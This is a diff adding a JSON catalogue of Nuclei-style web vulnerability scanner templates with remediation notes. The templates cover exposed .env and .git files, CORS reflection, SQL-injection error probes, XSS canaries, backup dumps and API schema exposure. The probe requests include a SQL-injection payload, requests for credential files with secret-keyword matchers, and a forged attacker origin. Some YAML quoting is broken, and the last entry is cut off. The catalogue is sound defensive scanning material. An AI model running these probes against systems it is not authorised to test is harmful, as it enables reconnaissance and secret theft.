@@ -1,0 +1,1096 @@
+[
+  {
+    "id": "owasp-security-headers",
+    "name": "Missing Defensive HTTP Security Headers",
+    "severity": "low",
+    "description": "Audits crucial defense-in-depth HTTP security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options: nosniff, Strict-Transport-Security) to prevent Clickjacking, MIME-sniffing, SSL downgrade, and XSS.",
+    "tags": [
+      "owasp",
+      "headers",
+      "defense-in-depth",
+      "burp-passive",
+      "hardening"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Add defensive HTTP security headers to your web server or reverse proxy (Nginx, Apache, Express, Caddy, Cloudflare):\n- Content-Security-Policy: default-src 'self'; script-src 'self' https:; object-src 'none';\n- X-Frame-Options: SAMEORIGIN\n- X-Content-Type-Options: nosniff\n- Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n- Referrer-Policy: strict-origin-when-cross-origin\n- Permissions-Policy: camera=(), microphone=(), geolocation=()",
+    "references": [
+      "https://owasp.org/www-project-secure-headers/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"
+    ],
+    "cvssScore": 3.1,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "cweId": "CWE-693",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: owasp-security-headers\ninfo:\n  name: Missing Defensive HTTP Security Headers\n  author: devsecops-auditor\n  severity: low\n  description: \"Audits crucial defense-in-depth HTTP security headers (Content-Security-Policy, X-Frame-Options, X-Content-Type-Options: nosniff, Strict-Transport-Security) to prevent Clickjacking, MIME-sniffing, SSL downgrade, and XSS.\"\n  reference:\n    - https://owasp.org/www-project-secure-headers/\n    - https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html\n  tags: owasp,headers,defense-in-depth,burp-passive,hardening\n  classification:\n    cvss-score: 3.1\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N\n    cwe-id: CWE-693\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Add defensive HTTP security headers to your web server or reverse proxy (Nginx, Apache, Express, Caddy, Cloudflare):\n    - Content-Security-Policy: default-src 'self'; script-src 'self' https:; object-src 'none';\n    - X-Frame-Options: SAMEORIGIN\n    - X-Content-Type-Options: nosniff\n    - Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\n    - Referrer-Policy: strict-origin-when-cross-origin\n    - Permissions-Policy: camera=(), microphone=(), geolocation=()\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/\"\n    matchers-condition: or\n    matchers:\n      - type: header\n        part: header\n        negative: true\n        words:\n          - \"content-security-policy\"\n        condition: or\n      - type: header\n        part: header\n        negative: true\n        words:\n          - \"x-frame-options\"\n        condition: or\n      - type: header\n        part: header\n        negative: true\n        words:\n          - \"x-content-type-options\"\n        condition: or\n      - type: header\n        part: header\n        negative: true\n        words:\n          - \"strict-transport-security\"\n        condition: or\n"
+  },
+  {
+    "id": "exposed-env-credentials",
+    "name": "Exposed Environment (.env) Credentials",
+    "severity": "critical",
+    "description": "Scans for publicly accessible .env configuration files leaking database secrets, API tokens, and production private keys.",
+    "tags": [
+      "exposure",
+      "credentials",
+      "critical",
+      "nuclei"
+    ],
+    "author": "nuclei-secops",
+    "remediation": "Immediately block public HTTP access to .env* files in web server configuration and invalidate/rotate any database credentials, AWS keys, or API tokens exposed.\nIn Nginx: location ~ /\\.env { deny all; return 404; }",
+    "references": [
+      "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure",
+      "https://cwe.mitre.org/data/definitions/200.html"
+    ],
+    "cvssScore": 9.1,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cweId": "CWE-200",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: exposed-env-credentials\ninfo:\n  name: Exposed Environment (.env) Credentials\n  author: nuclei-secops\n  severity: critical\n  description: Scans for publicly accessible .env configuration files leaking database secrets, API tokens, and production private keys.\n  reference:\n    - https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\n    - https://cwe.mitre.org/data/definitions/200.html\n  tags: exposure,credentials,critical,nuclei\n  classification:\n    cvss-score: 9.1\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\n    cwe-id: CWE-200\n    owasp-category: A01:2021-Broken Access Control\n  remediation: |\n    Immediately block public HTTP access to .env* files in web server configuration and invalidate/rotate any database credentials, AWS keys, or API tokens exposed.\n    In Nginx: location ~ /\\.env { deny all; return 404; }\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/.env\"\n      - \"{{BaseURL}}/.env.production\"\n      - \"{{BaseURL}}/.env.local\"\n      - \"{{BaseURL}}/.env.backup\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"DB_PASSWORD\"\n          - \"APP_KEY=\"\n          - \"DATABASE_URL=\"\n          - \"AWS_SECRET_ACCESS_KEY\"\n          - \"SECRET_KEY=\"\n          - \"JWT_SECRET=\"\n        condition: or\n"
+  },
+  {
+    "id": "exposed-git-repository",
+    "name": "Exposed Git Repository (.git/HEAD)",
+    "severity": "high",
+    "description": "Detects exposed .git folders containing source code, commit histories, developer branches, and embedded credentials.",
+    "tags": [
+      "git",
+      "exposure",
+      "source-code",
+      "nuclei"
+    ],
+    "author": "nuclei-secops",
+    "remediation": "Deny web access to /.git/ directory and all its child files via web server rules.\nIn Nginx: location ~ /\\.git { deny all; return 404; }\nIn Apache: RedirectMatch 404 /\\.git",
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces"
+    ],
+    "cvssScore": 7.5,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cweId": "CWE-538",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: exposed-git-repository\ninfo:\n  name: Exposed Git Repository (.git/HEAD)\n  author: nuclei-secops\n  severity: high\n  description: Detects exposed .git folders containing source code, commit histories, developer branches, and embedded credentials.\n  reference:\n    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Enumerate_Infrastructure_and_Application_Admin_Interfaces\n  tags: git,exposure,source-code,nuclei\n  classification:\n    cvss-score: 7.5\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n    cwe-id: CWE-538\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Deny web access to /.git/ directory and all its child files via web server rules.\n    In Nginx: location ~ /\\.git { deny all; return 404; }\n    In Apache: RedirectMatch 404 /\\.git\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/.git/HEAD\"\n      - \"{{BaseURL}}/.git/config\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"ref: refs/heads\"\n          - \"[core]\"\n          - \"repositoryformatversion\"\n        condition: or\n"
+  },
+  {
+    "id": "cors-misconfiguration",
+    "name": "CORS Wildcard & Arbitrary Origin Audit",
+    "severity": "medium",
+    "description": "Audits Cross-Origin Resource Sharing (CORS) policy for arbitrary origin reflection or insecure credentials exposure enabling cross-site data exfiltration.",
+    "tags": [
+      "cors",
+      "burp-active",
+      "owasp"
+    ],
+    "author": "burp-scanner",
+    "remediation": "1. Avoid reflecting untrusted Origin headers into Access-Control-Allow-Origin dynamically.\n2. Maintain an explicit whitelist of trusted frontend domains.\n3. Never set Access-Control-Allow-Origin to '*' or 'null' when Access-Control-Allow-Credentials is true.",
+    "references": [
+      "https://portswigger.net/web-security/cors",
+      "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny"
+    ],
+    "cvssScore": 5.3,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cweId": "CWE-346",
+    "owaspCategory": "A01:2021-Broken Access Control",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cors-misconfiguration\ninfo:\n  name: CORS Wildcard & Arbitrary Origin Audit\n  author: burp-scanner\n  severity: medium\n  description: Audits Cross-Origin Resource Sharing (CORS) policy for arbitrary origin reflection or insecure credentials exposure enabling cross-site data exfiltration.\n  reference:\n    - https://portswigger.net/web-security/cors\n    - https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny\n  tags: cors,burp-active,owasp\n  classification:\n    cvss-score: 5.3\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\n    cwe-id: CWE-346\n    owasp-category: A01:2021-Broken Access Control\n  remediation: |\n    1. Avoid reflecting untrusted Origin headers into Access-Control-Allow-Origin dynamically.\n    2. Maintain an explicit whitelist of trusted frontend domains.\n    3. Never set Access-Control-Allow-Origin to '*' or 'null' when Access-Control-Allow-Credentials is true.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/\"\n    headers:\n      Origin: \"https://evil-attacker-domain.com\"\n    matchers-condition: or\n    matchers:\n      - type: header\n        part: header\n        words:\n          - \"access-control-allow-origin: https://evil-attacker-domain.com\"\n          - \"access-control-allow-origin: null\"\n        condition: or\n      - type: header\n        part: header\n        words:\n          - \"access-control-allow-credentials: true\"\n          - \"access-control-allow-origin: *\"\n        condition: and\n"
+  },
+  {
+    "id": "server-version-disclosure",
+    "name": "Verbose Server & Tech Stack Fingerprint",
+    "severity": "info",
+    "description": "Detects detailed server banner headers (Server, X-Powered-By, X-AspNet-Version, X-Runtime) revealing exact framework or OS package versions.",
+    "tags": [
+      "fingerprint",
+      "information-disclosure",
+      "burp-passive"
+    ],
+    "author": "owasp-zap",
+    "remediation": "Disable verbose server banners and framework fingerprint headers:\n- In Express.js: app.disable('x-powered-by');\n- In Nginx: server_tokens off;\n- In Apache: ServerTokens Prod; ServerSignature Off;\n- In PHP: expose_php = Off in php.ini",
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server"
+    ],
+    "cvssScore": 0,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: server-version-disclosure\ninfo:\n  name: Verbose Server & Tech Stack Fingerprint\n  author: owasp-zap\n  severity: info\n  description: Detects detailed server banner headers (Server, X-Powered-By, X-AspNet-Version, X-Runtime) revealing exact framework or OS package versions.\n  reference:\n    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/02-Fingerprint_Web_Server\n  tags: fingerprint,information-disclosure,burp-passive\n  classification:\n    cvss-score: 0.0\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Disable verbose server banners and framework fingerprint headers:\n    - In Express.js: app.disable('x-powered-by');\n    - In Nginx: server_tokens off;\n    - In Apache: ServerTokens Prod; ServerSignature Off;\n    - In PHP: expose_php = Off in php.ini\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/\"\n    matchers-condition: or\n    matchers:\n      - type: header\n        part: header\n        words:\n          - \"x-powered-by:\"\n          - \"x-aspnet-version:\"\n          - \"x-runtime:\"\n          - \"server: apache/\"\n          - \"server: nginx/\"\n          - \"server: microsoft-iis/\"\n          - \"server: litespeed/\"\n          - \"server: gunicorn/\"\n          - \"server: uvicorn/\"\n          - \"server: openresty/\"\n          - \"server: cherokee/\"\n        condition: or\n"
+  },
+  {
+    "id": "robots-txt-disclosure",
+    "name": "Robots.txt Sensitive Endpoint Information Leak",
+    "severity": "info",
+    "description": "Parses robots.txt to discover hidden administration paths, private backup folders, or staging directories disclosed in Disallow rules.",
+    "tags": [
+      "robots",
+      "recon",
+      "information-disclosure",
+      "owasp"
+    ],
+    "author": "nuclei-secops",
+    "remediation": "Do not rely on robots.txt for access control. Restrict sensitive administrative, staging, and backup paths using proper authentication, authorization gates, and IP access lists rather than publishing their locations in public robots.txt files.",
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"
+    ],
+    "cvssScore": 0,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: robots-txt-disclosure\ninfo:\n  name: Robots.txt Sensitive Endpoint Information Leak\n  author: nuclei-secops\n  severity: info\n  description: Parses robots.txt to discover hidden administration paths, private backup folders, or staging directories disclosed in Disallow rules.\n  reference:\n    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage\n  tags: robots,recon,information-disclosure,owasp\n  classification:\n    cvss-score: 0.0\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N\n    cwe-id: CWE-200\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    Do not rely on robots.txt for access control. Restrict sensitive administrative, staging, and backup paths using proper authentication, authorization gates, and IP access lists rather than publishing their locations in public robots.txt files.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/robots.txt\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"Disallow: /admin\"\n          - \"Disallow: /administrator\"\n          - \"Disallow: /backup\"\n          - \"Disallow: /staging\"\n          - \"Disallow: /internal\"\n          - \"Disallow: /config\"\n          - \"Disallow: /secret\"\n          - \"Disallow: /wp-admin\"\n          - \"Disallow: /api/private\"\n          - \"Disallow: /db\"\n          - \"Disallow: /.git\"\n        condition: or\n"
+  },
+  {
+    "id": "cookie-security-flags",
+    "name": "Insecure Session Cookie Flags (HttpOnly/Secure)",
+    "severity": "low",
+    "description": "Audits Set-Cookie headers for missing HttpOnly, Secure, and SameSite flags that protect session cookies against XSS and cleartext theft.",
+    "tags": [
+      "cookies",
+      "session",
+      "owasp",
+      "burp-passive"
+    ],
+    "author": "burp-scanner",
+    "remediation": "Enforce security attributes on all authentication and session cookies:\n- Set 'HttpOnly' to prevent JavaScript access via document.cookie (mitigates XSS cookie theft).\n- Set 'Secure' to ensure cookies are transmitted exclusively over encrypted HTTPS connections.\n- Set 'SameSite=Lax' or 'SameSite=Strict' to protect against Cross-Site Request Forgery (CSRF).",
+    "references": [
+      "https://owasp.org/www-community/controls/SecureFlag",
+      "https://owasp.org/www-community/HttpOnly"
+    ],
+    "cvssScore": 3.1,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N",
+    "cweId": "CWE-614",
+    "owaspCategory": "A07:2021-Identification and Authentication Failures",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: cookie-security-flags\ninfo:\n  name: Insecure Session Cookie Flags (HttpOnly/Secure)\n  author: burp-scanner\n  severity: low\n  description: Audits Set-Cookie headers for missing HttpOnly, Secure, and SameSite flags that protect session cookies against XSS and cleartext theft.\n  reference:\n    - https://owasp.org/www-community/controls/SecureFlag\n    - https://owasp.org/www-community/HttpOnly\n  tags: cookies,session,owasp,burp-passive\n  classification:\n    cvss-score: 3.1\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N\n    cwe-id: CWE-614\n    owasp-category: A07:2021-Identification and Authentication Failures\n  remediation: |\n    Enforce security attributes on all authentication and session cookies:\n    - Set 'HttpOnly' to prevent JavaScript access via document.cookie (mitigates XSS cookie theft).\n    - Set 'Secure' to ensure cookies are transmitted exclusively over encrypted HTTPS connections.\n    - Set 'SameSite=Lax' or 'SameSite=Strict' to protect against Cross-Site Request Forgery (CSRF).\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/\"\n    matchers-condition: and\n    matchers:\n      - type: header\n        part: header\n        words:\n          - \"set-cookie\"\n        condition: or\n      - type: word\n        part: header\n        negative: true\n        words:\n          - \"httponly\"\n          - \"samesite\"\n        condition: and\n"
+  },
+  {
+    "id": "sqli-error-signatures",
+    "name": "Database Error Trace Signature Detection (SQLi Passive)",
+    "severity": "high",
+    "description": "Checks for database error trace disclosures (MySQL, PostgreSQL, Oracle, SQLite, SQL Server) leaked in application responses upon submitting benign test tokens.",
+    "tags": [
+      "sqli",
+      "injection",
+      "database",
+      "burp-active"
+    ],
+    "author": "nuclei-secops",
+    "remediation": "1. Use parameterized queries (Prepared Statements) or an ORM with query parameter binding exclusively.\n2. Disable verbose database error reporting in production HTTP responses; log errors server-side with structured tracking IDs.\n3. Enforce the principle of least privilege on database connection credentials.",
+    "references": [
+      "https://owasp.org/www-community/attacks/SQL_Injection",
+      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+    ],
+    "cvssScore": 7.5,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cweId": "CWE-89",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: sqli-error-signatures\ninfo:\n  name: Database Error Trace Signature Detection (SQLi Passive)\n  author: nuclei-secops\n  severity: high\n  description: Checks for database error trace disclosures (MySQL, PostgreSQL, Oracle, SQLite, SQL Server) leaked in application responses upon submitting benign test tokens.\n  reference:\n    - https://owasp.org/www-community/attacks/SQL_Injection\n    - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\n  tags: sqli,injection,database,burp-active\n  classification:\n    cvss-score: 7.5\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N\n    cwe-id: CWE-89\n    owasp-category: A03:2021-Injection\n  remediation: |\n    1. Use parameterized queries (Prepared Statements) or an ORM with query parameter binding exclusively.\n    2. Disable verbose database error reporting in production HTTP responses; log errors server-side with structured tracking IDs.\n    3. Enforce the principle of least privilege on database connection credentials.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?id=1%27%20OR%201=1--\"\n      - \"{{BaseURL}}/?query=%27\"\n      - \"{{BaseURL}}/?search=%27\"\n      - \"{{BaseURL}}/?cat=1%27\"\n      - \"{{BaseURL}}/?item=1%27\"\n      - \"{{BaseURL}}/?filter=%27\"\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"You have an error in your SQL syntax\"\n          - \"warning: mysql_\"\n          - \"pg_query(): Query failed: ERROR\"\n          - \"ORA-00933: SQL command not properly ended\"\n          - \"SQLite/JDBCDriver\"\n          - \"Unclosed quotation mark after the character string\"\n          - \"syntax error at or near\"\n        condition: or\n"
+  },
+  {
+    "id": "xss-reflection-passive",
+    "name": "Unsanitized Reflected Parameter Canary (XSS)",
+    "severity": "medium",
+    "description": "Tests if user-supplied query parameters are reflected verbatim without HTML entity escaping into the DOM response.",
+    "tags": [
+      "xss",
+      "injection",
+      "reflection",
+      "burp-active"
+    ],
+    "author": "burp-scanner",
+    "remediation": "1. Apply context-aware output encoding (HTML entity escaping for DOM text content and attributes).\n2. Enforce a robust Content-Security-Policy (CSP) that blocks inline scripts (no 'unsafe-inline') and restricts script origins.\n3. Use modern frontend frameworks (React, Angular, Vue) which perform automatic context escaping by default.",
+    "references": [
+      "https://owasp.org/www-community/attacks/xss/",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    ],
+    "cvssScore": 6.1,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+    "cweId": "CWE-79",
+    "owaspCategory": "A03:2021-Injection",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: xss-reflection-passive\ninfo:\n  name: Unsanitized Reflected Parameter Canary (XSS)\n  author: burp-scanner\n  severity: medium\n  description: Tests if user-supplied query parameters are reflected verbatim without HTML entity escaping into the DOM response.\n  reference:\n    - https://owasp.org/www-community/attacks/xss/\n    - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n  tags: xss,injection,reflection,burp-active\n  classification:\n    cvss-score: 6.1\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N\n    cwe-id: CWE-79\n    owasp-category: A03:2021-Injection\n  remediation: |\n    1. Apply context-aware output encoding (HTML entity escaping for DOM text content and attributes).\n    2. Enforce a robust Content-Security-Policy (CSP) that blocks inline scripts (no 'unsafe-inline') and restricts script origins.\n    3. Use modern frontend frameworks (React, Angular, Vue) which perform automatic context escaping by default.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/?sec_audit_probe=%3Csecprobe%3E\"\n      - \"{{BaseURL}}/?q=%3Csecprobe%3E\"\n      - \"{{BaseURL}}/?search=%3Csecprobe%3E\"\n      - \"{{BaseURL}}/?query=%3Csecprobe%3E\"\n      - \"{{BaseURL}}/?keyword=%3Csecprobe%3E\"\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"<secprobe>\"\n        condition: or\n"
+  },
+  {
+    "id": "sensitive-backup-files",
+    "name": "Exposed Database & Source Code Backup Dumps",
+    "severity": "high",
+    "description": "Probes for forgotten compressed backups (.zip, .sql, .tar.gz, .bak) left in web root directories leaking source code or database records.",
+    "tags": [
+      "backup",
+      "dumps",
+      "high",
+      "nuclei"
+    ],
+    "author": "nuclei-secops",
+    "remediation": "1. Immediately delete or move backup files (.sql, .tar.gz, .zip, .bak) outside the public web root directory.\n2. Add web server block rules denying access to archive and dump extensions:\n   In Nginx: location ~* \\.(sql|tar|tar\\.gz|zip|bak|old|dump)$ { deny all; return 404; }\n3. Automate backups to secure, authenticated cloud object storage rather than local web directories.",
+    "references": [
+      "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information"
+    ],
+    "cvssScore": 8.5,
+    "cvssVector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "cweId": "CWE-530",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: sensitive-backup-files\ninfo:\n  name: Exposed Database & Source Code Backup Dumps\n  author: nuclei-secops\n  severity: high\n  description: Probes for forgotten compressed backups (.zip, .sql, .tar.gz, .bak) left in web root directories leaking source code or database records.\n  reference:\n    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information\n  tags: backup,dumps,high,nuclei\n  classification:\n    cvss-score: 8.5\n    cvss-vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N\n    cwe-id: CWE-530\n    owasp-category: A05:2021-Security Misconfiguration\n  remediation: |\n    1. Immediately delete or move backup files (.sql, .tar.gz, .zip, .bak) outside the public web root directory.\n    2. Add web server block rules denying access to archive and dump extensions:\n       In Nginx: location ~* \\.(sql|tar|tar\\.gz|zip|bak|old|dump)$ { deny all; return 404; }\n    3. Automate backups to secure, authenticated cloud object storage rather than local web directories.\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/backup.sql\"\n      - \"{{BaseURL}}/database.sql\"\n      - \"{{BaseURL}}/dump.sql\"\n      - \"{{BaseURL}}/db.sql\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"-- MySQL dump\"\n          - \"INSERT INTO\"\n          - \"CREATE TABLE\"\n          - \"PostgreSQL database dump\"\n          - \"SQLite format 3\"\n        condition: or\n  - method: GET\n    path:\n      - \"{{BaseURL}}/backup.tar.gz\"\n      - \"{{BaseURL}}/backup.zip\"\n      - \"{{BaseURL}}/site-backup.zip\"\n      - \"{{BaseURL}}/database.tar.gz\"\n      - \"{{BaseURL}}/backup.bak\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: content-type\n        content-type:\n          - \"application/gzip\"\n          - \"application/zip\"\n          - \"application/x-tar\"\n          - \"application/x-gzip\"\n          - \"application/octet-stream\"\n          - \"application/x-zip-compressed\"\n      - type: size\n        min-size: 50\n"
+  },
+  {
+    "id": "swagger-openapi-disclosure",
+    "name": "swagger-openapi-disclosure",
+    "severity": "medium",
+    "description": "Custom security audit template",
+    "tags": [
+      "custom"
+    ],
+    "author": "analyst",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: swagger-openapi-disclosure\ninfo:\n  name: \"Exposed Swagger UI & OpenAPI Specification\"\n  author: devsecops-auditor\n  severity: medium\n  description: \"Detects exposed interactive Swagger UI or unauthenticated OpenAPI schema specifications disclosing API routes, parameter schemas, and hidden admin endpoints.\"\n  reference:\n    - https://owasp.org/www-project-api-security/\n  tags: api,swagger,openapi,disclosure,owasp\n  classification:\n    cvss-score: 5.3\n    cwe-id: CWE-200\n    owasp-category: A01:2021-Broken Access Control\n  remediation: \"Disable or protect Swagger UI and OpenAPI JSON/YAML endpoints in production environments behind authentication.\"\n\nrequests:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/swagger-ui.html\"\n      - \"{{BaseURL}}/swagger-ui/index.html\"\n      - \"{{BaseURL}}/v2/api-docs\"\n      - \"{{BaseURL}}/v3/api-docs\"\n      - \"{{BaseURL}}/openapi.json\"\n      - \"{{BaseURL}}/swagger.json\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"swagger-ui\"\n          - \"\"openapi\":\"\n          - \"\"swagger\":\"\n          - \"SwaggerUIBundle\"\n        condition: or\n"
+  },
+  {
+    "id": "graphql-introspection-enabled",
+    "name": "graphql-introspection-enabled",
+    "severity": "medium",
+    "description": "Custom security audit template",
+    "tags": [
+      "custom"
+    ],
+    "author": "analyst",
+    "enabled": true,
+    "isBuiltin": true,
+    "rawYaml": "id: graphql-introspection-enabled\ninfo:\n  name: \"GraphQL Schema Introspection Enabled\"\n  author: devsecops-auditor\n  severity: medium\n  description: \"Checks if GraphQL endpoint allows unauthenticated __schema introspection query, allowing attackers to map all queries, mutations, and backend data models.\"\n  reference:\n    - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html\n  tags: graphql,api,introspection,owasp\n  classification:\n    cvss-score: 5.3\n    cwe-id: CWE-200\n    owasp-category: A01:2021-Broken Access Control\n  remediation: \"Disable introspection query in production GraphQL servers (e.g., Apollo Server introspection: false).\"\n\nrequests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/graphql\"\n      - \"{{BaseURL}}/api/graphql\"\n      - \"{{BaseURL}}/query\"\n    headers:\n      Content-Type: \"application/json\"\n    body: \"{\\\"query\\\": \\\"{ __schema { types { name } } }\\\"}\"\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        part: body\n        words:\n          - \"\"__schema\"\"\n          - \"\"types\"\"\n        condition: and\n"
+  },
+  {
+    "id": "spring-boot-actuator-leak",
+    "name": "Spring Boot Actuator Endpoints Unauthenticated Exposure",
+    "severity": "high",
+    "description": "Detects exposed Spring Boot Actuator endpoints (/actuator, /actuator/env, /actuator/heapdump, /actuator/beans) leaking environment credentials and memory structures.",
+    "tags": [
+      "spring",
+      "actuator",
+      "java",
+      "high",
+      "owasp"
+    ],
+    "author": "devsecops-auditor",
+    "remediation": "Configure management.endpoints.web.exposure.include=health,info and require Spring Security authentication for sensitive endpoints.",
+    "references": [
+      "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"
+    ],
+    "cvssScore": 7.5,
+    "cweId": "CWE-200",
+    "owaspCategory": "A05:2021-Security Misconfiguration",
+    "enabled": true,
+    "isBuiltin": true,
